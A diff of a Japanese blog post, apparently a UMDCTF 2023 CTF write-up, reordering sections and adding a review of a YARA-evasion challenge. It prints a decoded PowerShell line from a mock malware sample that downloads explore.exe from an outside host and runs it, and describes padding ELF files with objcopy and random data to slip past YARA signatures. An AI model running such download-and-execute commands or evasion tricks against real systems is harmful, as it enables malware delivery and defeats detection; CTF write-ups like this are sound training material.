@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。) URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
@@ -40,22 +40,22 @@
 
 
 <meta property="og:title" content="UMDCTF 2023 Writeup" />
-<meta property="og:description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日" />
+<meta property="og:description" content="(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。) URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://captureamerica.github.io/writeups/post/umdctf_2023/" />
 <meta property="article:published_time" content="2023-05-04T14:00:00+09:00" />
-<meta property="article:modified_time" content="2023-05-04T14:00:00+09:00" />
+<meta property="article:modified_time" content="2023-05-29T16:00:00+09:00" />
 <meta itemprop="name" content="UMDCTF 2023 Writeup">
-<meta itemprop="description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日">
+<meta itemprop="description" content="(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。) URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り">
 <meta itemprop="datePublished" content="2023-05-04T14:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2023-05-04T14:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="4091">
+<meta itemprop="dateModified" content="2023-05-29T16:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="4604">
 
 
 
-<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="UMDCTF 2023 Writeup"/>
-<meta name="twitter:description" content="URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り、161位でした。 日曜日は、大好きなモンハンもやらず、ほぼ丸一日"/>
+<meta name="twitter:description" content="(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。) URL: https://umdctf.io/challenges UMDCTF は、3回目の参加です。 UMDCTF 2020 (147位) UMDCTF 2021 (175位) 今回は 1533 points を取り"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -160,28 +160,28 @@
         <li><a href="#solution-1">Solution</a></li>
       </ul>
     </li>
-    <li><a href="#forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</a>
+    <li><a href="#forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</a>
       <ul>
         <li><a href="#challenge-2">Challenge</a></li>
         <li><a href="#solution-2">Solution</a></li>
       </ul>
     </li>
-    <li><a href="#forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</a>
+    <li><a href="#forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</a>
       <ul>
         <li><a href="#challenge-3">Challenge</a></li>
         <li><a href="#solution-3">Solution</a></li>
       </ul>
     </li>
-    <li><a href="#forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</a>
-      <ul>
-        <li><a href="#challenge-4">Challenge</a></li>
-        <li><a href="#solution-4">Solution</a></li>
-      </ul>
-    </li>
     <li><a href="#forensics-doctors-hate-him-482-points">[Forensics]: Doctors hate him!! (482 points)</a>
       <ul>
-        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#challenge-4">Challenge</a></li>
         <li><a href="#unsolved">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
       </ul>
     </li>
   </ul>
@@ -194,6 +194,7 @@
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 </div>
+<p>(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。)</p>
 <p>URL: <a href="https://umdctf.io/challenges">https://umdctf.io/challenges</a>
 <br /><br /></p>
 <p>UMDCTF は、3回目の参加です。</p>
@@ -344,9 +345,142 @@ Content-Length: 49
 <p>Flag: <code>UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h2 id="forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</h2>
+<h2 id="forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</h2>
 <hr>
 <h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Someone was able to exfil a top secret document from our airgapped network! How???</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>bruh.gif</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>QRコードが含まれるアニメーションGIFです。</p>
+<p>試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。</p>
+<p>10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。</p>
+<p><br /></p>
+<p>このチャレンジは、Mac PC上で解きました。</p>
+<p>下準備。</p>
+<pre>
+$ pip install pyzbar
+$ brew install zbar
+$ pip install Pillow
+</pre>
+<p><br /></p>
+<p>書いたコード：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1">#-*- coding:utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageSequence</span>
+<span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
+
+<span class="n">IMAGE_PATH</span> <span class="o">=</span> <span class="s1">&#39;bruh.gif&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_frames</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="k">for</span> <span class="n">frame</span> <span class="ow">in</span> <span class="n">ImageSequence</span><span class="o">.</span><span class="n">Iterator</span><span class="p">(</span><span class="n">im</span><span class="p">))</span>
+
+<span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;brush.pdf&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
+<span class="n">frames</span> <span class="o">=</span> <span class="n">get_frames</span><span class="p">(</span><span class="n">IMAGE_PATH</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">f</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">frames</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">decode</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+        <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="c1"># print(base64.b64decode(data))</span>
+<span class="n">outfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>The challenge &ldquo;Doctors Hate Him&rdquo; is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
+<br /><br />
+Flag: UMDCTF{i_understand_that_malware_chall_is_sus}</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>&ldquo;Doctors Hate Him&rdquo; のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。</p>
+<p><br /></p>
+<p>Flag: <code>UMDCTF{i_understand_that_malware_chall_is_sus}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-doctors-hate-him-482-points">[Forensics]: Doctors hate him!! (482 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Someone sent me this in an email&hellip; ad targeting is hitting a little too close here smh&hellip;</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>Doctors-Hate-Him.zip</li>
+</ul>
+<p><br /></p>
+<h3 id="unsolved">(Unsolved)</h3>
+<p>イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。</p>
+<p>Zipファイルには、.chmファイルが入っています。</p>
+<p><br /></p>
+<p>実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。</p>
+<p>参考にしたUnit42のブログ：</p>
+<p><a href="https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/">https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/</a></p>
+<p><br /></p>
+<p>.chmファイルは、<code>7z x</code>で解凍が可能です。</p>
+<p><br /></p>
+<p>解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。</p>
+<p><code>I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.</code></p>
+<p><br /></p>
+<p>余計な <code>.</code> を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 <code>gurl_jnag_gurve</code> も見つかります。</p>
+<pre>
+Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
+</pre>
+<p><br /></p>
+<p>また、test.html には、コメントが含まれていて、フラグの一部 <code>UMDCTF{1997_called_</code> が見つかります。</p>
+<p><br /></p>
+<p><code>explore.exe</code>は、実際にダウンロードすることができて、Hash値は <code>63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</code> です。</p>
+<p><br /></p>
+<p>VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。</p>
+<p><a href="https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51">https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</a></p>
+<p><br /></p>
+<p>ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。</p>
+<p>わたしもその内の一人で、ここで詰みました。。</p>
+<p>他の方のWriteupを参照すると、http://dns-server.online:6969/ に <code>present.txt</code> というファイルがあり、そこから最後のフラグが取れたようですね。</p>
+<p><br /></p>
+<p>まぁ、そういうチャレンジもありなのかと思いますが、どうせなら<code>present.txt</code>に繋がる情報を<code>explore.exe</code>の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-yara-trainer-gym-427-points">[Forensics]: YARA Trainer Gym (427 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
 <blockquote>
 <p>My pokemon aren&rsquo;t very strong yet so I need to slip past the sigs written by the 8 YARA gym leaders! Can you help me!!!
 <br /><br />
@@ -480,7 +614,7 @@ Note: you can run the yara rules locally with yara yara_rules.yar $file
 </code></pre></td></tr></table>
 </div>
 </div><p><br /></p>
-<h3 id="solution-2">Solution</h3>
+<h3 id="solution-4">Solution</h3>
 <p>アクセスしてみると、任意のファイルがアップロードできるようになっています。</p>
 <p>スクリーンショットには全部写っていませんが、Gymは1〜8まであります。</p>
 <p><img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Yara.png" alt="umdctf_2023_Yara.png"> <br /></p>
@@ -795,138 +929,40 @@ rule8 hello_world.out
 <p><br /></p>
 <p>Flag: <code>UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}</code></p>
 <p><br /><br />
-<br /><br /></p>
-<h2 id="forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</h2>
-<hr>
-<h3 id="challenge-3">Challenge</h3>
-<blockquote>
-<p>Someone was able to exfil a top secret document from our airgapped network! How???</p>
-</blockquote>
-<p>Attachment:</p>
-<ul>
-<li>bruh.gif</li>
-</ul>
-<p><br /></p>
-<h3 id="solution-3">Solution</h3>
-<p>QRコードが含まれるアニメーションGIFです。</p>
-<p>試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。</p>
-<p>10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。</p>
-<p><br /></p>
-<p>このチャレンジは、Mac PC上で解きました。</p>
-<p>下準備。</p>
-<pre>
-$ pip install pyzbar
-$ brew install zbar
-$ pip install Pillow
-</pre>
-<p><br /></p>
-<p>書いたコード：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python3</span>
-<span class="c1">#-*- coding:utf-8 -*-</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageSequence</span>
-<span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
-
-<span class="n">IMAGE_PATH</span> <span class="o">=</span> <span class="s1">&#39;bruh.gif&#39;</span>
-
-<span class="k">def</span> <span class="nf">get_frames</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
-    <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
-    <span class="k">return</span> <span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="k">for</span> <span class="n">frame</span> <span class="ow">in</span> <span class="n">ImageSequence</span><span class="o">.</span><span class="n">Iterator</span><span class="p">(</span><span class="n">im</span><span class="p">))</span>
-
-<span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;brush.pdf&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
-<span class="n">frames</span> <span class="o">=</span> <span class="n">get_frames</span><span class="p">(</span><span class="n">IMAGE_PATH</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">f</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">frames</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">decode</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
-        <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
-        <span class="c1"># print(base64.b64decode(data))</span>
-<span class="n">outfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><br /></p>
-<p>Flag: <code>UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}</code></p>
-<p><br /><br />
-<br /><br /></p>
-<h2 id="forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</h2>
-<hr>
-<h3 id="challenge-4">Challenge</h3>
-<blockquote>
-<p>The challenge &ldquo;Doctors Hate Him&rdquo; is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
 <br /><br />
-Flag: UMDCTF{i_understand_that_malware_chall_is_sus}</p>
-</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はイベント終了後に行った復習です。</p>
+<p><br />
+elfファイルのセクション数を増やすのは、<code>objcopy</code> というコマンドが使えたようです。</p>
+<p>確かにググったら出てきますね。どうしてイベント中に見つからなかったんだろう。</p>
+<p><img src="https://captureamerica.github.io/writeups/img/umdctf_2023_objcopy.png" alt="umdctf_2023_objcopy.png"> <br /></p>
 <p><br /></p>
-<h3 id="solution-4">Solution</h3>
-<p>&ldquo;Doctors Hate Him&rdquo; のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。</p>
-<p><br /></p>
-<p>Flag: <code>UMDCTF{i_understand_that_malware_chall_is_sus}</code></p>
-<p><br /><br />
-<br /><br /></p>
-<h2 id="forensics-doctors-hate-him-482-points">[Forensics]: Doctors hate him!! (482 points)</h2>
-<hr>
-<h3 id="challenge-5">Challenge</h3>
-<blockquote>
-<p>Someone sent me this in an email&hellip; ad targeting is hitting a little too close here smh&hellip;</p>
-</blockquote>
-<p>Attachment:</p>
-<ul>
-<li>Doctors-Hate-Him.zip</li>
-</ul>
-<p><br /></p>
-<h3 id="unsolved">(Unsolved)</h3>
-<p>イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。</p>
-<p>Zipファイルには、.chmファイルが入っています。</p>
-<p><br /></p>
-<p>実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。</p>
-<p>参考にしたUnit42のブログ：</p>
-<p><a href="https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/">https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/</a></p>
-<p><br /></p>
-<p>.chmファイルは、<code>7z x</code>で解凍が可能です。</p>
-<p><br /></p>
-<p>解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。</p>
-<p><code>I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.</code></p>
-<p><br /></p>
-<p>余計な <code>.</code> を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 <code>gurl_jnag_gurve</code> も見つかります。</p>
+<p>ということで、とりあえずC言語でコード（前述）を書いてelfファイルを作った後に、<code>objcopy</code>を使うのが手っ取り早い方法だったみたいです。</p>
 <pre>
-Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
+$ objcopy --add-section poophaha=/dev/null YARA_solve.o
 </pre>
 <p><br /></p>
-<p>また、test.html には、コメントが含まれていて、フラグの一部 <code>UMDCTF{1997_called_</code> が見つかります。</p>
+<p>エントロピーを上げる方法は、規則性の無いランダムデータ（圧縮データ、暗号化データ）が埋め込まれていればいいので、自分がやったように .jpg や .mpg を含める方法でもよかったのですが、<code>/dev/urandom</code> を使うのが正攻法（？）だったようです。</p>
 <p><br /></p>
-<p><code>explore.exe</code>は、実際にダウンロードすることができて、Hash値は <code>63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</code> です。</p>
+<p>このランダムデータは、<code>objcopy</code> を使って追加するセクション部分に入れてもいいですし、yara ruleの中で位置のチェックはしていないのでファイルの末尾にappendしても行けますね。</p>
+<pre>
+$ head -c 1500000 /dev/urandom >> YARA_solve.o
+</pre>
 <p><br /></p>
-<p>VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。</p>
-<p><a href="https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51">https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</a></p>
+<p>手持ちのファイルを使うんだったら、こんな感じ。</p>
+<pre>
+$ cat snow_slide.mp4 >> YARA_solve.o
+</pre>
+<p>あるいは、</p>
+<pre>
+$ objcopy --add-section aaa=snow_slide.mp4 YARA_solve.o
+</pre>
 <p><br /></p>
-<p>ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。</p>
-<p>わたしもその内の一人で、ここで詰みました。。</p>
-<p>他の方のWriteupを参照すると、http://dns-server.online:6969/ に <code>present.txt</code> というファイルがあり、そこから最後のフラグが取れたようですね。</p>
-<p><br /></p>
-<p>まぁ、そういうチャレンジもありなのかと思いますが、どうせなら<code>present.txt</code>に繋がる情報を<code>explore.exe</code>の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。</p>
+<p>挿入位置に関しては、文字列についても同様で、コードに含めなくても末尾に付ける方法もアリです。</p>
+<pre>
+$ echo "jessie" >> YARA_solve.o
+</pre>
 <p><br /><br />
 <br /><br /></p>
 <hr>
@@ -943,7 +979,7 @@ Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explor
   <p class="copyright-item">
     <span class="item-title">LastMod</span>
     <span class="item-content">
-        2023-05-04
+        2023-05-29
         
     </span>
   </p>
@@ -953,6 +989,7 @@ Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explor
 <footer class="post-footer">
       <div class="post-tags">
           <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
           </div>
       <nav class="post-nav">
         
